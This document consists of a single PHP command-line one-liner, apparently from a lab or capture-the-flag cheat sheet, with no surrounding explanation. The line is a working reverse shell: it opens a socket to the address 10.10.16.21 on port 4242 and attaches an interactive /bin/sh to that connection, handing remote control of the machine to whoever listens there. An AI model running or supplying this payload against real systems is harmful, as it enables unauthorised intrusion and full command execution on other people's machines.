php -r '$sock=fsockopen("10.10.16.21",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
